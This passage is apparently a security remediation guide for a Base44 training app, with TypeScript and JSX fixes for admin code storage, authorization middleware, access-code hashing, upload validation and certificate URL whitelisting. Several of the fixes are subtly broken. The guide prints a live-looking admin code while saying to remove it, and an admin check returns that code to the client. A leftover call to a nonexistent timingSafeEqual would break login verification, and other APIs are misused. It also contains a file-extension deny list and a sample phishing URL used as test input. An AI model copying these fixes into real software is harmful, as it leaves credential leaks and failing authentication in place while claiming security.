          "INVALID_ADMIN_CODE",
          "Invalid admin code"
        );
      }
      
      // Clear failed attempts on success
      failedAttempts.delete(clientIp);
      
      // Log successful admin access
      console.info(`[AUDIT] Admin access granted to ${ADMIN_NAME} from ${clientIp}`);
      
      // Return success with credentials
      return {
        success: true,
        admin_name: ADMIN_NAME!,
        admin_code: ADMIN_CODE!,
        error: null
      };
      
    } catch (error) {
      if (error instanceof FunctionError) throw error;
      
      console.error("[ERROR] Admin verification failed:", error);
      throw new FunctionError(
        "VERIFICATION_ERROR",
        "Failed to verify admin access"
      );
    }
  }
});
```

**4. Create .env.local (NEVER commit to Git):**

```bash
# .env.local
ADMIN_CODE=1357441
ADMIN_NAME=aa admin 1357441
```

**Verify in .gitmore:**
```
.env
.env.*
```

**Validation Steps:**

1. Remove hardcoded values:
   ```bash
   grep -r "1357441" Src/  # Should return 0 results
   grep -r "aa admin" Src/   # Should return 0 results
   ```

2. Test admin login:
   - Navigate to admin tab
   - Enter wrong code → "Invalid admin code" error (no rate limiting bypass)
   - Enter correct code from .env.local → "Admin access granted"
   - Check backend logs for audit trail

3. Verify frontend build:
   ```bash
   npm run build
   cd dist/assets
   grep -l "1357441" *.js  # Should return empty
   ```

---

### FIX #2: Implement Backend Authorization Validation

**Problem:** All permission checks only happen in frontend JavaScript. Any user can call backend APIs directly.

**Solution:** Implement authorization middleware on backend for all admin operations.

**1. Create Authorization Middleware:**

```typescript
// base44/middleware/adminAuth.ts

import { defineMiddleware, MiddlewareError } from "@base44/sdk";

export interface AuthContext {
  member: any;
  clientIp: string;
  timestamp: number;
}

export const adminAuthMiddleware = defineMiddleware({
  name: "adminAuth",
  
  async handler(context, next) {
    try {
      // Get authenticated member from Base44 SDK
      const member = context.auth?.member;
      
      if (!member) {
        throw new MiddlewareError("UNAUTHORIZED", "User not authenticated");
      }
      
      // Verify member is still active
      if (member.account_active === false) {
        throw new MiddlewareError("ACCOUNT_SUSPENDED", "Account has been suspended");
      }
      
      // Store auth context for handler use
      context.authContext = {
        member,
        clientIp: context.request.headers.get("x-forwarded-for") || "unknown",
        timestamp: Date.now()
      };
      
      // Continue to handler
      return next();
      
    } catch (error) {
      if (error instanceof MiddlewareError) throw error;
      throw new MiddlewareError("AUTH_ERROR", "Authentication check failed");
    }
  }
});

// Helper to check admin level
export function requireAdminLevel(requiredLevel: number) {
  return (context: any) => {
    const adminLevel = Number(context.authContext?.member?.admin_level || 0);
    if (adminLevel < requiredLevel) {
      throw new MiddlewareError(
        "INSUFFICIENT_PERMISSIONS",
        `Requires admin level ${requiredLevel}, you have level ${adminLevel}`
      );
    }
  };
}
```

**2. Update Member Update Functions:**

```typescript
// base44/functions/member-operations.ts

import { defineFunction, FunctionError } from "@base44/sdk";
import { adminAuthMiddleware, requireAdminLevel } from "../middleware/adminAuth";

// Approve Level (requires admin level 2+)
export const approveMemberLevel = defineFunction({
  name: "approveMemberLevel",
  middleware: [adminAuthMiddleware],
  input: {
    type: "object",
    properties: {
      memberId: { type: "string" },
      level: { type: "number", enum: [1, 2, 3] }
    },
    required: ["memberId", "level"]
  },
  async handler(context, input) {
    try {
      // Check permissions (level 4 can do anything, others limited)
      const adminLevel = Number(context.authContext?.member?.admin_level || 0);
      if (adminLevel < 2) {
        throw new FunctionError(
          "INSUFFICIENT_PERMISSIONS",
          "Requires admin level 2 to approve levels"
        );
      }
      
      // Get member being approved
      const member = await context.entities.Member.get(input.memberId);
      if (!member) {
        throw new FunctionError("NOT_FOUND", "Member not found");
      }
      
      // Level 4 can approve any level, others can only approve up to their level
      if (adminLevel !== 4 && input.level > adminLevel) {
        throw new FunctionError(
          "CANNOT_APPROVE_HIGHER_LEVEL",
          `Cannot approve level ${input.level} with admin level ${adminLevel}`
        );
      }
      
      // Verify member has actually submitted the required work
      const certField = `level${input.level}_cert_submitted`;
      if (!member[certField]) {
        throw new FunctionError(
          "NOT_SUBMITTED",
          "Member has not submitted required work"
        );
      }
      
      // Update member (backend performs the actual update)
      const completeField = `level${input.level}_complete`;
      const updated = await context.entities.Member.update(input.memberId, {
        [completeField]: true
      });
      
      // Log audit trail
      await context.entities.AuditLog.create({
        action: `approved_level_${input.level}`,
        actor_id: context.authContext.member.id,
        actor_name: context.authContext.member.member_name,
        target_id: input.memberId,
        target_name: member.member_name,
        timestamp: new Date().toISOString(),
        ip_address: context.authContext.clientIp
      });
      
      // Send email notification
      await context.integrations.Core.SendEmail({
        to: member.email,
        subject: `Level ${input.level} Approved`,
        body: `Congratulations! Level ${input.level} has been approved.`
      });
      
      return { success: true, member: updated };
      
    } catch (error) {
      if (error instanceof FunctionError) throw error;
      throw new FunctionError("UPDATE_ERROR", "Failed to approve level");
    }
  }
});

// Revoke Certificate (requires admin level 2+)
export const revokeMemberCertificate = defineFunction({
  name: "revokeMemberCertificate",
  middleware: [adminAuthMiddleware],
  input: {
    type: "object",
    properties: {
      memberId: { type: "string" },
      level: { type: "number", enum: [1, 2, 3] }
    },
    required: ["memberId", "level"]
  },
  async handler(context, input) {
    try {
      const adminLevel = Number(context.authContext?.member?.admin_level || 0);
      if (adminLevel < 2) {
        throw new FunctionError(
          "INSUFFICIENT_PERMISSIONS",
          "Requires admin level 2 to revoke certificates"
        );
      }
      
      const member = await context.entities.Member.get(input.memberId);
      if (!member) {
        throw new FunctionError("NOT_FOUND", "Member not found");
      }
      
      // Prevent unauthorized attempts
      if (adminLevel !== 4 && Number(member.admin_level || 0) >= adminLevel) {
        throw new FunctionError(
          "CANNOT_MODIFY_SAME_LEVEL",
          "Cannot modify users of equal or higher level"
        );
      }
      
      const completeField = `level${input.level}_complete`;
      const updated = await context.entities.Member.update(input.memberId, {
        [completeField]: false
      });
      
      // Audit log
      await context.entities.AuditLog.create({
        action: `revoked_level_${input.level}`,
        actor_id: context.authContext.member.id,
        actor_name: context.authContext.member.member_name,
        target_id: input.memberId,
        target_name: member.member_name,
        timestamp: new Date().toISOString(),
        ip_address: context.authContext.clientIp,
        severity: "HIGH"
      });
      
      return { success: true, member: updated };
      
    } catch (error) {
      if (error instanceof FunctionError) throw error;
      throw new FunctionError("REVOKE_ERROR", "Failed to revoke certificate");
    }
  }
});

// Delete Member (requires admin level 4 - super admin only)
export const deleteMemberProfile = defineFunction({
  name: "deleteMemberProfile",
  middleware: [adminAuthMiddleware],
  input: {
    type: "object",
    properties: {
      memberId: { type: "string" }
    },
    required: ["memberId"]
  },
  async handler(context, input) {
    try {
      const adminLevel = Number(context.authContext?.member?.admin_level || 0);
      if (adminLevel !== 4) {
        throw new FunctionError(
          "INSUFFICIENT_PERMISSIONS",
          "Only super admins can delete member profiles"
        );
      }
      
      const member = await context.entities.Member.get(input.memberId);
      if (!member) {
        throw new FunctionError("NOT_FOUND", "Member not found");
      }
      
      // Prevent self-deletion
      if (input.memberId === context.authContext.member.id) {
        throw new FunctionError(
          "CANNOT_DELETE_SELF",
          "Cannot delete your own profile"
        );
      }
      
      // Soft delete (set account_active to false instead of permanent delete)
      const updated = await context.entities.Member.update(input.memberId, {
        account_active: false,
        account_status: "Deleted by admin",
        deleted_at: new Date().toISOString(),
        deleted_by: context.authContext.member.member_name
      });
      
      // Audit log with HIGH severity
      await context.entities.AuditLog.create({
        action: "deleted_profile",
        actor_id: context.authContext.member.id,
        actor_name: context.authContext.member.member_name,
        target_id: input.memberId,
        target_name: member.member_name,
        timestamp: new Date().toISOString(),
        ip_address: context.authContext.clientIp,
        severity: "CRITICAL"
      });
      
      return { success: true, member: updated };
      
    } catch (error) {
      if (error instanceof FunctionError) throw error;
      throw new FunctionError("DELETE_ERROR", "Failed to delete member");
    }
  }
});
```

**3. Update Frontend to Use Backend Functions:**

```javascript
// Src/api/Components/training/Admindashboard.jsx

// Replace all direct API calls with backend function calls

const approveLevel = async (m, l) => {
    if (level !== 4 && l > level) { 
        toast({ title: `Cannot approve level ${l}`, variant: "destructive" }); 
        return; 
    }
    
    try {
      // Now calls backend function with authorization
      const result = await base44.functions.approveMemberLevel({
        memberId: m.id,
        level: l
      });
      
      if (result.success) {
        toast({ title: t("msg.approved") });
        onAudit(`approved L${l}`, m.member_name);
        await sendTemplateEmail(`level${l}_approval`, { member_name: m.member_name }, allMembers, t);
        onRefresh();
      }
    } catch (err) {
      toast({ title: err.message || t("msg.save_failed"), variant: "destructive" });
    }
};

const revokeLevel = async (m, l) => {
    try {
      const result = await base44.functions.revokeMemberCertificate({
        memberId: m.id,
        level: l
      });
      
      if (result.success) {
        toast({ title: t("msg.revoked") });
        onAudit(`revoked L${l}`, m.member_name);
        onRefresh();
      }
    } catch (err) {
      toast({ title: err.message || t("msg.save_failed"), variant: "destructive" });
    }
};

const deleteMember = async (m) => {
    if (!deleteArmed.has(m.id)) { 
        setDeleteArmed(prev => new Set(prev).add(m.id)); 
        toast({ title: `Confirm delete ${m.member_name}`, variant: "destructive" }); 
        return; 
    }
    
    try {
      const result = await base44.functions.deleteMemberProfile({
        memberId: m.id
      });
      
      if (result.success) {
        toast({ title: t("msg.deleted") });
        onAudit('deleted profile', m.member_name);
        onRefresh();
      }
    } catch (err) {
      toast({ title: err.message || t("msg.save_failed"), variant: "destructive" });
    }
};
```

**Validation Steps:**

1. Test authorization enforcement:
   ```bash
   # Login as regular user (admin_level: 0)
   # Try to call:
   base44.functions.approveMemberLevel({memberId: "xyz", level: 1})
   # Should return: "Insufficient permissions"
   ```

2. Test audit logging:
   ```
   Approve a member as admin
   Check AuditLog entity
   Should see entry with actor, action, target, timestamp, IP
   ```

3. Test at each admin level:
   - Level 0: Can't perform any admin actions
   - Level 1: Can announce, review
   - Level 2: Can reset, revoke, approve levels
   - Level 3: Can manage access
   - Level 4: Can do everything

---

### FIX #3: Hash Access Codes

**Problem:** Access codes stored as plaintext. Database compromise = all credentials leaked.

**Solution:** Hash access codes using bcrypt, verify on authentication.

**1. Update Member Entity:**

```jsonc
// BASE/enitity/Member.jsonc

{
  "name": "Member",
  "type": "object",
  "properties": {
    "member_name": { "type": "string" },
    "email": { "type": "string" },
    "profile_picture": { "type": "string" },
    
    // CHANGED: access_code is now hashed
    "access_code_hash": {
      "type": "string",
      "description": "Bcrypt hash of access code (do not expose to frontend)"
    },
    
    // NEW: Salt for additional security (optional with bcrypt)
    "access_code_salt": {
      "type": "string"
    },
    
    "admin_level": {
      "type": "number",
      "default": 0
    },
    
    // ... rest of properties unchanged
  }
}
```

**2. Create Backend Function for Code Verification:**

```typescript
// base44/functions/verifyAccessCode.ts

import { defineFunction, FunctionError } from "@base44/sdk";

export const verifyAccessCode = defineFunction({
  name: "verifyAccessCode",
  input: {
    type: "object",
    properties: {
      member_name: { type: "string" },
      access_code: { type: "string" }
    },
    required: ["member_name", "access_code"]
  },
  async handler(context, input) {
    try {
      // Find member by name
      const members = await context.entities.Member.filter({ 
        member_name: input.member_name 
      });
      
      if (members.length === 0) {
        throw new FunctionError("NOT_FOUND", "Member not found");
      }
      
      const member = members[0];
      
      // Check if account is active
      if (member.account_active === false) {
        throw new FunctionError("ACCOUNT_SUSPENDED", "Account is suspended");
      }
      
      // Verify access code using bcrypt
      const isValid = await Deno.crypto.subtle.timingSafeEqual(
        new TextEncoder().encode(input.access_code),
        new TextEncoder().encode(member.access_code_hash) // This would fail - see better approach below
      );
      
      // Actually, use bcrypt library:
      const { compare } = await import("https://deno.land/x/bcrypt@v0.4.1/mod.ts");
      const validCode = await compare(input.access_code, member.access_code_hash);
      
      if (!validCode) {
        // Log failed attempt
        await context.entities.AuditLog.create({
          action: "failed_authentication",
          target_name: input.member_name,
          timestamp: new Date().toISOString(),
          ip_address: context.request.headers.get("x-forwarded-for") || "unknown",
          severity: "MEDIUM"
        });
        
        throw new FunctionError("INVALID_CODE", "Invalid access code");
      }
      
      // Log successful authentication
      await context.entities.AuditLog.create({
        action: "successful_authentication",
        target_id: member.id,
        target_name: member.member_name,
        timestamp: new Date().toISOString(),
        ip_address: context.request.headers.get("x-forwarded-for") || "unknown"
      });
      
      return {
        success: true,
        member: {
          id: member.id,
          member_name: member.member_name,
          email: member.email,
          admin_level: member.admin_level,
          account_active: member.account_active
          // DO NOT RETURN access_code_hash!
        }
      };
      
    } catch (error) {
      if (error instanceof FunctionError) throw error;
      throw new FunctionError("VERIFICATION_ERROR", "Failed to verify code");
    }
  }
});
```

**3. Create Hash Generation Function:**

```typescript
// base44/functions/hashAccessCode.ts

import { defineFunction, FunctionError } from "@base44/sdk";

export const hashAccessCode = defineFunction({
  name: "hashAccessCode",
  input: {
    type: "object",
    properties: {
      access_code: { type: "string" }
    },
    required: ["access_code"]
  },
  async handler(context, input) {
    try {
      const { hash } = await import("https://deno.land/x/bcrypt@v0.4.1/mod.ts");
      
      // Hash with salt rounds = 12 (secure but not too slow)
      const hashed = await hash(input.access_code, 12);
      
      return {
        success: true,
        hash: hashed
      };
    } catch (error) {
      throw new FunctionError("HASH_ERROR", "Failed to hash access code");
    }
  }
});
```

**4. Update Member Creation:**

```typescript
// base44/functions/createMember.ts

export const createMember = defineFunction({
  name: "createMember",
  input: {
    type: "object",
    properties: {
      member_name: { type: "string" },
      access_code: { type: "string" },
      email: { type: "string" }
    },
    required: ["member_name", "access_code", "email"]
  },
  async handler(context, input) {
    try {
      // Check for duplicates
      const existing = await context.entities.Member.filter({
        member_name: input.member_name
      });
      
      if (existing.length > 0) {
        throw new FunctionError("DUPLICATE", "Member already exists");
      }
      
      // Hash the access code
      const { hash } = await import("https://deno.land/x/bcrypt@v0.4.1/mod.ts");
      const access_code_hash = await hash(input.access_code, 12);
      
      // Create member with hashed code
      const member = await context.entities.Member.create({
        member_name: input.member_name,
        access_code_hash: access_code_hash,  // Store hash, not plaintext
        email: input.email,
        admin_level: 0,
        language: 'en',
        theme: 'dark',
        text_size: 5,
        account_active: true,
        welcome_seen: false
      });
      
      return {
        success: true,
        member: {
          id: member.id,
          member_name: member.member_name,
          email: member.email,
          admin_level: member.admin_level
          // DO NOT RETURN access_code_hash
        }
      };
      
    } catch (error) {
      if (error instanceof FunctionError) throw error;
      throw new FunctionError("CREATE_ERROR", "Failed to create member");
    }
  }
});
```

**5. Update AuthGate to Use Backend Verification:**

```javascript
// Src/api/Components/training/AuthGate.jsx

const handleSignIn = async (e) => {
    e.preventDefault();
    setError('');
    if (!NAME_REGEX.test(name)) return setError(t("auth.name_error"));
    if (!CODE_REGEX.test(code)) return setError(t("auth.code_error"));
    setLoading(true);
    try {
      // Call backend function to verify credentials
      const result = await base44.functions.verifyAccessCode({
        member_name: name,
        access_code: code
      });
      
      if (result.success) {
        onProfileLoaded(result.member);
      }
    } catch (err) { 
      setError(err.message || t("auth.code_error"));
    }
    setLoading(false);
};

const handleCreate = async (e) => {
    e.preventDefault();
    setError('');
    if (!NAME_REGEX.test(name)) return setError(t("auth.name_error"));
    if (!CODE_REGEX.test(code)) return setError(t("auth.code_error"));
    if (name.toLowerCase().includes('admin')) return setError(t("auth.name_error"));
    setLoading(true);
    try {
      // Call backend to create member (which hashes the code)
      const result = await base44.functions.createMember({
        member_name: name,
        access_code: code,
        email: user?.email || ''
      });
      
      if (result.success) {
        toast({ title: t("msg.profile_created") });
        onProfileLoaded(result.member);
      }
    } catch (err) { 
      setError(err.message || t("auth.create_error"));
    }
    setLoading(false);
};
```

**Validation Steps:**

1. Create a member:
   ```
   Enter name: "John D"
   Enter code: "123456"
   Check Member entity
   access_code_hash should be a bcrypt hash (starts with $2a$, ~60 chars)
   Should NOT contain "123456" in plaintext
   ```

2. Verify code hash:
   ```
   Same member, try to sign in with "123456"
   Should succeed
   Try sign in with "123457"
   Should fail with "Invalid access code"
   ```

3. Dump database:
   ```
   Export Member records
   All access codes should be hashed
   No plaintext codes visible
   ```

---

### FIX #4: Validate File Uploads

**Problem:** No validation of file type, size, or content. Arbitrary files accepted.

**Solution:** Implement server-side file validation with MIME type, size limits, and content scanning.

**1. Create File Upload Validation Function:**

```typescript
// base44/functions/validateAndUploadFile.ts

import { defineFunction, FunctionError } from "@base44/sdk";

const ALLOWED_MIME_TYPES = {
  image: ["image/jpeg", "image/png", "image/webp", "image/gif"],
  video: ["video/mp4", "video/webm", "video/quicktime"],
  pdf: ["application/pdf"]
};

const MAX_FILE_SIZES = {
  image: 5 * 1024 * 1024,      // 5MB
  video: 100 * 1024 * 1024,    // 100MB
  certificate: 10 * 1024 * 1024 // 10MB for certificates
};

// Magic byte signatures to verify file content
const MAGIC_BYTES = {
  jpeg: [0xFF, 0xD8, 0xFF],
  png: [0x89, 0x50, 0x4E, 0x47],
  gif: [0x47, 0x49, 0x46],
  pdf: [0x25, 0x50, 0x44, 0x46],
  mp4: [0x00, 0x00, 0x00, 0x20, 0x66, 0x74, 0x79, 0x70]
};

export const validateAndUploadFile = defineFunction({
  name: "validateAndUploadFile",
  input: {
    type: "object",
    properties: {
      file: { type: "string", description: "Base64 encoded file" },
      filename: { type: "string" },
      fileType: { type: "string", enum: ["image", "video", "certificate"] },
      mimeType: { type: "string" }
    },
    required: ["file", "filename", "fileType", "mimeType"]
  },
  async handler(context, input) {
    try {
      // 1. Validate MIME type against whitelist
      const allowedTypes = ALLOWED_MIME_TYPES[input.fileType] || [];
      if (!allowedTypes.includes(input.mimeType)) {
        throw new FunctionError(
          "INVALID_MIME_TYPE",
          `File type ${input.mimeType} not allowed. Allowed: ${allowedTypes.join(", ")}`
        );
      }
      
      // 2. Validate file size
      const maxSize = MAX_FILE_SIZES[input.fileType] || 5 * 1024 * 1024;
      const fileBuffer = Deno.core.decode(input.file);
      
      if (fileBuffer.byteLength > maxSize) {
        throw new FunctionError(
          "FILE_TOO_LARGE",
          `File size ${fileBuffer.byteLength} exceeds limit of ${maxSize} bytes`
        );
      }
      
      // 3. Verify magic bytes (file signature)
      const headerBytes = fileBuffer.slice(0, 12);
      const isValidContent = validateMagicBytes(headerBytes, input.fileType);
      
      if (!isValidContent) {
        throw new FunctionError(
          "INVALID_FILE_CONTENT",
          "File content does not match declared type (possible disguised malware)"
        );
      }
      
      // 4. Sanitize filename
      const sanitizedFilename = sanitizeFilename(input.filename);
      
      // 5. Check for suspicious file extensions
      const ext = sanitizedFilename.split('.').pop()?.toLowerCase();
      const suspiciousExts = ['exe', 'bat', 'cmd', 'com', 'scr', 'vbs', 'js', 'jar', 'zip', 'rar'];
      if (suspiciousExts.includes(ext || '')) {
        throw new FunctionError(
          "SUSPICIOUS_FILE_TYPE",
          `File type .${ext} not allowed`
        );
      }
      
      // 6. Scan for malware (optional - requires integration with antivirus API)
      // Example: await scanWithClamAV(fileBuffer);
      
      // 7. Generate unique filename to prevent overwrites
      const uniqueFilename = `${Date.now()}-${Math.random().toString(36).substr(2, 9)}-${sanitizedFilename}`;
      
      // 8. Upload to storage
      const uploadResult = await context.integrations.Core.UploadFile({
        file: new File(
          [fileBuffer],
          uniqueFilename,
          { type: input.mimeType }
        )
      });
      
      // 9. Log file upload
      await context.entities.AuditLog.create({
        action: "file_uploaded",
        details: {
          filename: sanitizedFilename,
          size: fileBuffer.byteLength,
          type: input.fileType,
          url: uploadResult.file_url
        },
        timestamp: new Date().toISOString(),
        ip_address: context.request.headers.get("x-forwarded-for") || "unknown"
      });
      
      return {
        success: true,
        file_url: uploadResult.file_url,
        filename: sanitizedFilename,
        size: fileBuffer.byteLength
      };
      
    } catch (error) {
      if (error instanceof FunctionError) throw error;
      
      // Log security event
      console.error("[SECURITY] File upload rejected:", error.message);
      throw new FunctionError("UPLOAD_ERROR", "File upload validation failed");
    }
  }
});

function validateMagicBytes(headerBytes: Uint8Array, fileType: string): boolean {
  const checks: Record<string, () => boolean> = {
    image: () => {
      // Check for JPEG, PNG, or GIF magic bytes
      if (headerBytes[0] === 0xFF && headerBytes[1] === 0xD8 && headerBytes[2] === 0xFF) return true; // JPEG
      if (headerBytes[0] === 0x89 && headerBytes[1] === 0x50 && headerBytes[2] === 0x4E && headerBytes[3] === 0x47) return true; // PNG
      if (headerBytes[0] === 0x47 && headerBytes[1] === 0x49 && headerBytes[2] === 0x46) return true; // GIF
      return false;
    },
    video: () => {
      // Check for MP4, WebM, or MOV magic bytes
      if (headerBytes[4] === 0x66 && headerBytes[5] === 0x74 && headerBytes[6] === 0x79 && headerBytes[7] === 0x70) return true; // MP4/MOV
      if (headerBytes[0] === 0x1A && headerBytes[1] === 0x45 && headerBytes[2] === 0xDF && headerBytes[3] === 0xA3) return true; // WebM
      return false;
    },
    certificate: () => {
      // Check for PDF magic bytes
      if (headerBytes[0] === 0x25 && headerBytes[1] === 0x50 && headerBytes[2] === 0x44 && headerBytes[3] === 0x46) return true; // PDF
      return false;
    }
  };
  
  return (checks[fileType] || (() => false))();
}

function sanitizeFilename(filename: string): string {
  // Remove path traversal attempts
  let safe = filename.replace(/\.\.\//g, '').replace(/\.\.\\/g, '');
  
  // Remove special characters, keep only alphanumeric, dash, underscore, and dot
  safe = safe.replace(/[^a-zA-Z0-9._-]/g, '_');
  
  // Limit length
  if (safe.length > 200) {
    safe = safe.substring(0, 200);
  }
  
  // Ensure at least one character
  if (!safe || safe === '' || safe === '.') {
    safe = 'file';
  }
  
  return safe;
}
```

**2. Update Exercise.jsx to Use Backend Upload:**

```javascript
// Src/api/Components/training/Excersise.jsx

const handleFile = async (e) => {
    const file = e.target.files[0];
    if (!file) return;
    
    // Validate client-side first (for UX)
    const allowedTypes = ['image/jpeg', 'image/png', 'image/webp', 'video/mp4'];
    if (!allowedTypes.includes(file.type)) {
      toast({ 
        title: "Invalid file type. Allowed: JPEG, PNG, WebP, MP4",
        variant: "destructive"
      });
      return;
    }
    
    if (file.size > 100 * 1024 * 1024) {
      toast({ 
        title: "File too large. Maximum: 100MB",
        variant: "destructive"
      });
      return;
    }
    
    setUploading(true);
    try {
      // Read file as base64
      const reader = new FileReader();
      reader.onload = async () => {
        const base64 = reader.result.split(',')[1];
        
        // Call backend validation function
        const result = await base44.functions.validateAndUploadFile({
          file: base64,
          filename: file.name,
          fileType: file.type.startsWith('video') ? 'video' : 'image',
          mimeType: file.type
        });
        
        if (result.success) {
          setLink(result.file_url);
          setMediaType(file.type.startsWith('video') ? 'video' : 'image');
          toast({ title: t("msg.saved") });
        }
      };
      reader.readAsDataURL(file);
      
    } catch (err) {
      toast({ title: err.message || t("msg.save_failed"), variant: "destructive" });
    }
    setUploading(false);
};
```

**3. Update Settings.jsx for Profile Picture:**

```javascript
// Src/api/Components/training/Settings.jsx

const handlePicture = async (e) => {
    const file = e.target.files[0];
    if (!file) return;
    
    // Client-side validation
    if (!file.type.startsWith('image/')) {
      toast({ 
        title: "Please upload an image file",
        variant: "destructive"
      });
      return;
    }
    
    if (file.size > 5 * 1024 * 1024) {
      toast({ 
        title: "Image must be smaller than 5MB",
        variant: "destructive"
      });
      return;
    }
    
    setUploading(true);
    try {
      const reader = new FileReader();
      reader.onload = async () => {
        const base64 = reader.result.split(',')[1];
        
        const result = await base44.functions.validateAndUploadFile({
          file: base64,
          filename: file.name,
          fileType: 'image',
          mimeType: file.type
        });
        
        if (result.success) {
          await onUpdate({ profile_picture: result.file_url });
          toast({ title: t("msg.saved") });
        }
      };
      reader.readAsDataURL(file);
      
    } catch (err) {
      toast({ title: err.message || t("msg.save_failed"), variant: "destructive" });
    }
    setUploading(false);
};
```

**Validation Steps:**

1. Try uploading valid image:
   ```
   Select PNG file (5MB)
   Should succeed
   File stored with sanitized name
   ```

2. Try uploading executable:
   ```
   Select .exe file renamed to .jpg
   Backend detects magic bytes don't match
   Returns: "File content does not match declared type"
   ```

3. Try oversized file:
   ```
   Upload 150MB video
   Returns: "File size exceeds limit of 100MB"
   ```

4. Check audit log:
   ```
   Every file upload logged with filename, size, type, URL
   ```

---

### FIX #5: Validate Certificate URLs

**Problem:** Admin can set arbitrary certificate URL, enabling phishing and malware distribution.

**Solution:** Whitelist certificate URLs and implement validation before use.

**1. Create URL Validation Function:**

```typescript
// base44/functions/validateCertificateUrl.ts

import { defineFunction, FunctionError } from "@base44/sdk";

// Whitelist of approved certificate storage domains
const APPROVED_DOMAINS = [
  "base44.com",
  "media.base44.com",
  "cdn.base44.com",
  // Add your trusted storage domains here
];

export const validateCertificateUrl = defineFunction({
  name: "validateCertificateUrl",
  input: {
    type: "object",
    properties: {
      url: { type: "string" },
      context_type: { type: "string", enum: ["template_image", "cert_file"] }
    },
    required: ["url", "context_type"]
  },
  async handler(context, input) {
    try {
      // 1. Validate URL format
      let parsedUrl: URL;
      try {
        parsedUrl = new URL(input.url);
      } catch {
        throw new FunctionError("INVALID_URL", "URL is not valid");
      }
      
      // 2. Must be HTTPS
      if (parsedUrl.protocol !== "https:") {
        throw new FunctionError(
          "INSECURE_PROTOCOL",
          "Certificate URLs must use HTTPS"
        );
      }
      
      // 3. Check domain whitelist
      const isApproved = APPROVED_DOMAINS.some(domain => 
        parsedUrl.hostname === domain || parsedUrl.hostname.endsWith("." + domain)
      );
      
      if (!isApproved) {
        throw new FunctionError(
          "DOMAIN_NOT_APPROVED",
          `Domain ${parsedUrl.hostname} is not in the approved list. Approved: ${APPROVED_DOMAINS.join(", ")}`
        );
      }
      
      // 4. Prevent parameter injection
      const suspiciousParams = ["redirect", "callback", "return", "url", "next"];
      for (const param of suspiciousParams) {
        if (parsedUrl.searchParams.has(param)) {
          throw new FunctionError(
            "SUSPICIOUS_URL",
            `URL contains suspicious parameter: ${param}`
          );
        }
      }
      
      // 5. Fetch URL headers to verify it's accessible and safe
      try {
        const response = await fetch(input.url, {
          method: "HEAD",
          timeout: 5000 // 5 second timeout
        });
        
        // Check response headers
        const contentType = response.headers.get("content-type") || "";
        const allowedContentTypes = {
          template_image: ["image/jpeg", "image/png", "image/webp"],
          cert_file: ["application/pdf", "image/png"]
        };
        
        const allowed = allowedContentTypes[input.context_type] || [];
        if (!allowed.some(type => contentType.includes(type))) {
          throw new FunctionError(
            "INVALID_CONTENT_TYPE",
            `Content type ${contentType} not allowed. Allowed: ${allowed.join(", ")}`
          );
        }
        
        // Check file size via Content-Length header
        const contentLength = parseInt(response.headers.get("content-length") || "0");
        if (contentLength > 50 * 1024 * 1024) { // 50MB max
          throw new FunctionError(
            "FILE_TOO_LARGE",
            "Certificate file exceeds maximum size"
          );
        }
        
      } catch (fetchError) {
        if (fetchError instanceof FunctionError) throw fetchError;
        throw new FunctionError(
          "UNREACHABLE_URL",
          "Certificate URL is not accessible or took too long to respond"
        );
      }
      
      return {
        success: true,
        url: input.url,
        message: "URL validation successful"
      };
      
    } catch (error) {
      if (error instanceof FunctionError) throw error;
      throw new FunctionError("VALIDATION_ERROR", "Failed to validate certificate URL");
    }
  }
});
```

**2. Update TemplateEditor to Validate URLs:**

```javascript
// Src/api/Components/training/TemplateEditing.jsx

const handleUpload = async (e) => {
    const file = e.target.files[0];
    if (!file) return;
    setUploading(true);
    try {
      const { file_url } = await base44.integrations.Core.UploadFile({ file });
      
      // Validate URL before storing
      const validation = await base44.functions.validateCertificateUrl({
        url: file_url,
        context_type: 'template_image'
      });
      
      if (validation.success) {
        setForm(prev => ({ ...prev, image_url: file_url }));
        toast({ title: t("tmpl.image_uploaded") });
      }
    } catch (err) {
      toast({ title: err.message || t("msg.save_failed"), variant: "destructive" });
    }
    setUploading(false);
};

// Prevent manual URL input without validation
const save = async () => {
    setSaving(true);
    try {
      // Validate image_url if provided
      if (form.image_url && form.use_image) {
        const validation = await base44.functions.validateCertificateUrl({
          url: form.image_url,
          context_type: 'template_image'
        });
        
        if (!validation.success) {
          toast({ title: "Certificate URL validation failed", variant: "destructive" });
          setSaving(false);
          return;
        }
      }
      
      // Rest of save logic...
      const existing = templates[currentType];
      if (existing) {
        await base44.entities.EmailTemplate.update(existing.id, { 
          ...form, 
          updated_by: member.member_name 
        });
      } else {
        await base44.entities.EmailTemplate.create({ 
          ...form, 
          template_type: currentType, 
          updated_by: member.member_name 
        });
      }
      
      toast({ title: t("tmpl.saved") });
      onAudit('updated email template', t(`tmpl.${currentType}`));
      
    } catch (err) {
      toast({ title: err.message || t("msg.save_failed"), variant: "destructive" });
    }
    setSaving(false);
};
```

**3. Prevent Manual URL Input in Form:**

```javascript
// Src/api/Components/training/TemplateEditing.jsx

return (
  <div className="glass-card p-5">
    {/* ... other template options ... */}
    
    {form.use_image && (
      <div className="space-y-3">
        <label className="btn-soft flex items-center justify-center gap-2 cursor-pointer">
          <Upload className="w-4 h-4" /> 
          {uploading ? '...' : t("tmpl.upload_image")}
          <input type="file" accept="image/*" onChange={handleUpload} className="hidden" />
        </label>
        
        {form.image_url ? (
          <div>
            <p className="text-xs mb-2" style={{ color: 'var(--training-muted)' }}>
              {t("tmpl.image_preview")}
            </p>
            
            {/* Display URL but disable manual editing */}
            <div className="p-3 rounded-lg" style={{ background: 'rgba(255,255,255,0.05)' }}>
              <p className="text-xs font-mono break-all" style={{ color: 'var(--training-muted)' }}>
                {form.image_url}
              </p>
              <button 
                onClick={() => setForm(prev => ({ ...prev, image_url: '' }))}
                className="text-xs mt-2 px-3 py-1 rounded bg-red-500/20 text-red-400"
              >
                Clear Image
              </button>
            </div>
            
            {/* ... position/color controls ... */}
          </div>
        ) : (
          <p className="text-sm" style={{ color: 'var(--training-muted)' }}>
            {t("tmpl.no_image")}
          </p>
        )}
      </div>
    )}
  </div>
);
```

**Validation Steps:**

1. Try uploading from approved domain:
   ```
   Upload image from base44.com CDN
   Should succeed
   Image stored and verified
   ```

2. Try entering phishing URL:
   ```
   Try to set image_url to "https://phishing.com/fake.jpg"
   Validation returns: "Domain not approved"
   ```

3. Try HTTP instead of HTTPS:
   ```
   Try "http://example.com/cert.jpg"
   Returns: "Must use HTTPS"
   ```

4. Test unreachable URL:
   ```
   Try "https://base44.com/nonexistent.jpg"
   URL validation fetches it
   Returns: "Certificate URL is not accessible"
   ```

---

